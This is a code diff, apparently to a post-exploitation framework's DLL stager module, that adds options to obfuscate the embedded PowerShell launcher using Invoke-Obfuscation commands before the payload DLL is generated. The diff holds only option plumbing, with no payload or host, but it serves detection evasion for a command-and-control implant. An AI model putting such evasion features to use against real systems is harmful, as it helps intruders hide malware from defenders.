@@ -64,6 +64,16 @@ class Stager:
                 'Description'   :   'File to output dll to.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/launcher.dll'
+            },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   r'Token\All\1'
             }
         }
 
@@ -89,14 +99,23 @@ class Stager:
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
 
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
             print helpers.color("[!] Invalid listener: " + listenerName)
             return ""
         else:
+            obfuscateScript = False
+            if obfuscate.lower() == "true":
+                obfuscateScript = True
+            
+            if obfuscateScript and "launcher" in obfuscateCommand.lower():
+                print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager.")
+                return ""
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
